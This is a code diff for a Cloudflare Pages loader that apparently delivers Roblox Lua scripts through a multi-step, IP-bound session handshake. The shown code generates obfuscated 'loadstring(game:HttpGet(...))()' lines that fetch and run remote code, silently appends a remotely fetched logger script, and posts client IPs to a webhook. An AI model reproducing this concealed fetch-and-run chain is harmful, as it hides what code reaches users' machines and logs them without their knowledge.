@@ -1,5 +1,5 @@
 // functions/api/loader/[[path]].js - Cloudflare Pages Functions
-// Loader dengan multi-layer protection
+// LOADER DENGAN MULTI-LAYER PROTECTION - FIXED VERSION
 
 const SETTINGS = {
     TOTAL_LAYERS: 5,
@@ -11,10 +11,13 @@ const SETTINGS = {
     LOGGER_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader-api/refs/heads/main/api/logger/logscript.lua"
 };
 
-let sessions = {};
-let rateLimits = {};
+// Gunakan global object untuk menyimpan sessions dan rateLimits
+// Karena Cloudflare Pages Functions bisa di-cache, kita perlu hati-hati
+const state = {
+    sessions: {},
+    rateLimits: {}
+};
 
-// Fetch dengan fetch API (bukan https.get)
 async function fetchRaw(url) {
     try {
         const response = await fetch(url);
@@ -30,7 +33,6 @@ function getRandomError() {
     return errorCodes[Math.floor(Math.random() * errorCodes.length)];
 }
 
-// Send security log ke webhook (pake fetch)
 async function sendSecurityLogToLogJs(message, ip, type) {
     const data = JSON.stringify({ 
         type: "security",
@@ -43,8 +45,7 @@ async function sendSecurityLogToLogJs(message, ip, type) {
         const response = await fetch('https://httpbin-ndraawz.pages.dev/api/loggeraja', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': data.length.toString()
+                'Content-Type': 'application/json'
             },
             body: data
         });
@@ -55,10 +56,7 @@ async function sendSecurityLogToLogJs(message, ip, type) {
 }
 
 function obfuscateUrl(url) {
-    // Pastikan URL hanya mengandung karakter aman
     const safeUrl = url.trim();
-
-    // Split jadi potongan 2-4 karakter
     const parts = [];
     let i = 0;
     while (i < safeUrl.length) {
@@ -67,17 +65,13 @@ function obfuscateUrl(url) {
         i += len;
     }
 
-    // Shuffle index
     const indices = [...Array(parts.length).keys()];
     for (let i = indices.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [indices[i], indices[j]] = [indices[j], indices[i]];
     }
 
-    // Array isi acak berdasarkan shuffle
     const shuffledParts = indices.map(i => parts[i]);
-
-    // Escape semua karakter berbahaya
     const arrayStr = shuffledParts.map(p => {
         const escaped = p
             .replace(/\\/g, '\\\\')
@@ -88,13 +82,11 @@ function obfuscateUrl(url) {
         return `'${escaped}'`;
     }).join(',');
 
-    // Mapping posisi asli ke posisi shuffled
     const orderMap = new Array(parts.length);
     indices.forEach((originalIdx, shuffledIdx) => {
         orderMap[originalIdx] = shuffledIdx + 1;
     });
 
-    // Nama variabel acak 2-3 huruf hindari keyword lua
     const luaKeywords = ['do','if','in','or','and','end','for','nil','not','repeat','then','true','false','local','while','break','else','elseif','function','return','until'];
     const chars = 'abcdefghijklmnopqrstuvwxyz';
     let varName = '';
@@ -106,9 +98,7 @@ function obfuscateUrl(url) {
         }
     } while (luaKeywords.includes(varName));
 
-    // Concat acak
     const concatStr = orderMap.map(i => `${varName}[${i}]`).join('..');
-
     return `local ${varName}={${arrayStr}}loadstring(game:HttpGet(${concatStr}))()`;
 }
 
@@ -119,7 +109,7 @@ function makeSession(ownerIp, stepSequence, currentIndex) {
     const newSessionID = seed.toString(36).substring(0, 4).padEnd(4, 'x');
     const nextKey = Math.random().toString(36).substring(2, 8);
 
-    sessions[newSessionID] = {
+    state.sessions[newSessionID] = {
         ownerIP: ownerIp,
         stepSequence: stepSequence,
         currentIndex: currentIndex,
@@ -132,115 +122,132 @@ function makeSession(ownerIp, stepSequence, currentIndex) {
 }
 
 function expireSession(id) {
-    if (sessions[id]) {
-        sessions[id].used = true;
-        setTimeout(() => delete sessions[id], SETTINGS.SESSION_TTL);
+    if (state.sessions[id]) {
+        state.sessions[id].used = true;
+        setTimeout(() => {
+            delete state.sessions[id];
+        }, SETTINGS.SESSION_TTL);
     }
 }
 
-// Cleanup sessions dan rate limits (pake interval di Cloudflare)
+// Cleanup setiap 5 menit
 setInterval(() => {
     const now = Date.now();
-    for (const id in sessions) {
-        if (now - sessions[id].lastTime > 300000) delete sessions[id];
+    for (const id in state.sessions) {
+        if (now - state.sessions[id].lastTime > 300000) {
+            delete state.sessions[id];
+        }
     }
-    for (const ip in rateLimits) {
-        if (now - rateLimits[ip].firstRequestAt > SETTINGS.RATE_LIMIT_MS) delete rateLimits[ip];
+    for (const ip in state.rateLimits) {
+        if (now - state.rateLimits[ip].firstRequestAt > SETTINGS.RATE_LIMIT_MS) {
+            delete state.rateLimits[ip];
+        }
     }
 }, 300000);
 
-// Export handler untuk Cloudflare Pages
+// EXPORT UNTUK CLOUDFLARE PAGES
 export async function onRequest(context) {
     const { request } = context;
     
-    // Set headers
-    const headers = {
+    // Headers response
+    const responseHeaders = {
         'Content-Type': 'text/plain',
         'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+        'Access-Control-Allow-Methods': 'GET, OPTIONS',
         'Access-Control-Allow-Headers': 'Content-Type',
+        'Cache-Control': 'no-cache, no-store, must-revalidate'
     };
 
     // Handle OPTIONS
     if (request.method === 'OPTIONS') {
-        return new Response(null, { status: 204, headers });
+        return new Response(null, { 
+            status: 204, 
+            headers: responseHeaders 
+        });
     }
 
-    // Only allow GET
+    // Hanya allow GET
     if (request.method !== 'GET') {
         return new Response('Method Not Allowed', { 
             status: 405, 
-            headers 
+            headers: responseHeaders 
         });
     }
 
     const now = Date.now();
-    const ip = request.headers.get('x-real-ip') || 
+    
+    // Get IP
+    const ip = request.headers.get('cf-connecting-ip') || 
+               request.headers.get('x-real-ip') || 
                request.headers.get('x-forwarded-for')?.split(',')[0] || 
                "unknown";
-    const agent = request.headers.get('user-agent') || "";
-    const cleanIp = ip.replace('::ffff:', '');
+    const cleanIp = ip.replace('::ffff:', '').trim();
     
-    const isRoblox = agent.includes("Roblox") && 
-                     (request.headers.get('roblox-id') || 
-                      request.headers.get('x-roblox-place-id') || 
-                      agent.includes("RobloxApp"));
+    // Get User-Agent
+    const agent = request.headers.get('user-agent') || "";
+    
+    // Cek Roblox
+    const isRoblox = agent.includes("Roblox") || 
+                     agent.includes("RobloxApp") ||
+                     request.headers.get('roblox-id') !== null ||
+                     request.headers.get('x-roblox-place-id') !== null;
+    
     const isDiscord = agent.includes("Discordbot");
     
+    // Jika bukan Roblox atau Discord bot
     if (!isRoblox || isDiscord) {
         const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
         return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
             status: getRandomError(),
-            headers
+            headers: responseHeaders
         });
     }
     
+    // Parse URL
     const url = new URL(request.url);
-    const urlParts = url.pathname.split('/');
-    const queryString = url.search || "";
-    const params = queryString.replace('?', '').split('.');
+    const pathname = url.pathname;
+    const search = url.search;
     
-    const step = params[0]; 
-    const id = params[1];   
-    const key = params[2];  
+    // Parse params dari query string
+    const params = search ? search.replace('?', '').split('.') : [];
+    const step = params[0] || '0';
+    const id = params[1] || '';
+    const key = params[2] || '';
     
     const currentStep = parseInt(step) || 0;
-    const host = request.headers.get('host');
-    const currentPath = url.pathname;
+    const host = request.headers.get('host') || 'your-domain.pages.dev';
     
     try {
         // ========== STEP 0: RATE LIMIT + INIT SESSION ==========
         if (currentStep === 0) {
-            const rateData = rateLimits[cleanIp];
-
-            if (rateData) {
+            // Rate limit check
+            if (!state.rateLimits[cleanIp]) {
+                state.rateLimits[cleanIp] = { count: 1, firstRequestAt: now };
+            } else {
+                const rateData = state.rateLimits[cleanIp];
                 const elapsed = now - rateData.firstRequestAt;
-                const sisaCooldown = Math.ceil((SETTINGS.RATE_LIMIT_MS - elapsed) / 1000);
-
+                
                 if (elapsed < SETTINGS.RATE_LIMIT_MS) {
                     rateData.count++;
                     if (rateData.count > SETTINGS.RATE_LIMIT_MAX) {
+                        const sisaCooldown = Math.ceil((SETTINGS.RATE_LIMIT_MS - elapsed) / 1000);
                         await sendSecurityLogToLogJs(
-                            `🚨 **SPAM DETECTED**\n` +
-                            `📡 **IP:** \`${cleanIp}\`\n` +
-                            `🔢 **Load ke:** ${rateData.count}x (maks ${SETTINGS.RATE_LIMIT_MAX}x per ${SETTINGS.RATE_LIMIT_MS / 1000} detik)\n` +
-                            `⏳ **Sisa cooldown:** ${sisaCooldown} detik lagi`,
+                            `🚨 SPAM DETECTED\nIP: ${cleanIp}\nLoad ke: ${rateData.count}x (maks ${SETTINGS.RATE_LIMIT_MAX}x per ${SETTINGS.RATE_LIMIT_MS / 1000} detik)\nSisa cooldown: ${sisaCooldown} detik`,
                             cleanIp,
                             "spam_detect"
                         );
                         const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
                         return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
                             status: getRandomError(),
-                            headers
+                            headers: responseHeaders
                         });
                     }
                 } else {
-                    rateLimits[cleanIp] = { count: 1, firstRequestAt: now };
+                    state.rateLimits[cleanIp] = { count: 1, firstRequestAt: now };
                 }
-            } else {
-                rateLimits[cleanIp] = { count: 1, firstRequestAt: now };
             }
 
+            // Generate sequence
             let sequence = [];
             while (sequence.length < SETTINGS.TOTAL_LAYERS) {
                 let r = Math.floor(Math.random() * 300) + 1;
@@ -248,63 +255,58 @@ export async function onRequest(context) {
             }
 
             const { newSessionID, nextKey } = makeSession(cleanIp, sequence, 0);
-            const nextUrl = "https://" + host + currentPath + "?" + sequence[0] + "." + newSessionID + "." + nextKey;
+            const nextUrl = `https://${host}${pathname}?${sequence[0]}.${newSessionID}.${nextKey}`;
+            
             return new Response(obfuscateUrl(nextUrl), {
                 status: 200,
-                headers
+                headers: responseHeaders
             });
         }
 
-        // ========== VALIDASI HANDSHAKE ==========
-        const session = sessions[id];
+        // ========== VALIDASI SESSION ==========
+        const session = state.sessions[id];
 
         if (!session || session.ownerIP !== cleanIp) {
             const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
             return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
                 status: getRandomError(),
-                headers
+                headers: responseHeaders
             });
         }
 
+        // Cek step
         if (currentStep !== session.stepSequence[session.currentIndex]) {
             expireSession(id);
             return new Response("SECURITY : BANNED ACCESS!", {
                 status: getRandomError(),
-                headers
+                headers: responseHeaders
             });
         }
 
-        // ========== CEK REPLAY ATTACK ==========
+        // Cek replay attack
         if (session.used === true) {
             await sendSecurityLogToLogJs(
-                `🚫 **REPLAY ATTACK DETECTED**\n` +
-                `📡 **IP:** \`${cleanIp}\`\n` +
-                `🔑 **Key:** \`${key}\`\n` +
-                `🆔 **Session ID:** \`${id}\`\n` +
-                `⚠️ Mencoba mengakses link yang sudah mati`,
+                `REPLAY ATTACK DETECTED\nIP: ${cleanIp}\nKey: ${key}\nSession ID: ${id}`,
                 cleanIp,
                 "replay_attack"
             );
             return new Response("SECURITY : BANNED ACCESS!", {
                 status: getRandomError(),
-                headers
+                headers: responseHeaders
             });
         }
 
-        // ========== CEK INVALID KEY ==========
+        // Cek invalid key
         if (session.nextKey !== key) {
             await sendSecurityLogToLogJs(
-                `🔑 **INVALID KEY DETECTED**\n` +
-                `📡 **IP:** \`${cleanIp}\`\n` +
-                `❌ **Key dikirim:** \`${key}\`\n` +
-                `⚠️ Key tidak cocok`,
+                `INVALID KEY DETECTED\nIP: ${cleanIp}\nKey dikirim: ${key}`,
                 cleanIp,
                 "invalid_key"
             );
             expireSession(id);
             return new Response("SECURITY : BANNED ACCESS!", {
                 status: getRandomError(),
-                headers
+                headers: responseHeaders
             });
         }
 
@@ -316,7 +318,7 @@ export async function onRequest(context) {
             expireSession(id);
             return new Response(mainScript || '', {
                 status: 200,
-                headers
+                headers: responseHeaders
             });
         }
 
@@ -328,12 +330,12 @@ export async function onRequest(context) {
             expireSession(id);
 
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
-            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
+            const nextUrl = `https://${host}${pathname}?${nextStepNumber}.${newSessionID}.${nextKey}`;
 
             const luaScript = obfuscateUrl(nextUrl) + "\n" + (loggerScript || '');
             return new Response(luaScript, {
                 status: 200,
-                headers
+                headers: responseHeaders
             });
         }
 
@@ -343,17 +345,18 @@ export async function onRequest(context) {
         const { newSessionID, nextKey } = makeSession(session.ownerIP, session.stepSequence, nextIdx);
         expireSession(id);
 
-        const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
+        const nextUrl = `https://${host}${pathname}?${nextStepNumber}.${newSessionID}.${nextKey}`;
         return new Response(obfuscateUrl(nextUrl), {
             status: 200,
-            headers
+            headers: responseHeaders
         });
 
     } catch (err) {
+        console.error('Loader Error:', err);
         const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
         return new Response(plainResp || "SECURITY : BANNED ACCESS!", {
             status: getRandomError(),
-            headers
+            headers: responseHeaders
         });
     }
 }
